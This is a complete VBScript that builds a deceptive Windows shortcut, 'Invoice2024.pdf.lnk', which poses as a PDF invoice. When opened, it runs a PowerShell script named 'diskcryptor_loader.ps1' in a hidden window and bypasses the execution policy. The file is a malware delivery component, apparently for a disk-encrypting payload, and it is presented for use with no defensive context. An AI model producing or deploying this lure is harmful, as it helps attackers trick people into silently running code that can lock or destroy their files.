' shortcut_creator.vbs
' Creates a shortcut to run diskcryptor_loader.ps1 with hidden PowerShell window

Set oWS = CreateObject("WScript.Shell")

' Change this to your actual .ps1 location if different
ps1Path = "C:\Users\Public\Documents\diskcryptor_loader.ps1"

' Where the shortcut will be created
sLinkFile = "C:\Users\Public\Documents\Invoice2024.pdf.lnk"

Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
oLink.Arguments = "-windowstyle hidden -ExecutionPolicy Bypass -File """ & ps1Path & """"
oLink.IconLocation = "C:\Windows\System32\shell32.dll,13"
oLink.WorkingDirectory = "C:\Users\Public\Documents"
oLink.Save
